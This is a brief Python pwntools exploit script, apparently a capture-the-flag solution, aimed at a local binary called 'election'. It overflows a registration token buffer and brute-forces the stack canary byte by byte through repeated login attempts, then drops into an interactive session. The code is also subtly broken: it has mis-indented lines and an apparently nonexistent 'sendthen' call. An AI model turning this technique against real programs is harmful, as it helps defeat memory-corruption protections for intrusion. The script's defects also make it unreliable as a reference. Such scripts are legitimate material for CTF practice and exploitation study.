#!/usr/bin/env python
from pwn import *

context.arch = 'amd64'

r = process('./election', env={"LD_PRELOAD" : "./libc.so"})
pause()

# leak canary bruteforcely
aaa = 'a' * 0xb8
canary_leaker = bytearray([0])

r.sendlineafter('>', '2') # register
r.sendthen('Register an anonymous token: ', aaa)

for j in range(8):
    for i in range(0xff):
        r.sendlineafter('>', '1') # login
        r.sendthen('Token: ', aaa + bytes(canary_leaker)) 
        canary_leaker[-1] += 1
        if 'Invalid' not in r.recvline():
            success('buf {} bytes match: {}'.format(j, canary_leaker))
                r.sendlineafter('>', '3') # logout
                break
        canary_leaker.append(0)

r.interactive()

